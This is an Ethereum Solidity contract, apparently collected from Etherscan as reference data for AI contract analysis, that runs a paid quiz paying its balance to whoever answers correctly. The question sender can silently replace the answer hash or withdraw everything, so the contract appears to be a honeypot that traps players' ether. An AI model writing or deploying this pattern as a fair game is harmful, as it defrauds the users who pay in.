/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.24;

contract AlexTrebek
{
    bytes32 responseHash;
    string public Jeopardy;
    address questionSender;

    function Answer(string response)
    public payable {
        if (responseHash == keccak256(response) && msg.value > 1 ether) {
            msg.sender.transfer(address(this).balance);
        }
    }
 
    function QuestionIs(string question, string response)
    public payable {
        if (responseHash == 0x0) {
            responseHash = keccak256(response);
            Jeopardy = question;
            questionSender = msg.sender;
        }
    }

    function EndQuestion()
    public payable {
        if (msg.sender == questionSender) {
            msg.sender.transfer(address(this).balance);
        }
    }

    function NewQuestion(string question, bytes32 _responseHash)
    public payable {
        if (msg.sender == questionSender) {
            Jeopardy = question;
            responseHash = _responseHash;
        }
    }
    
    function () payable public {}
}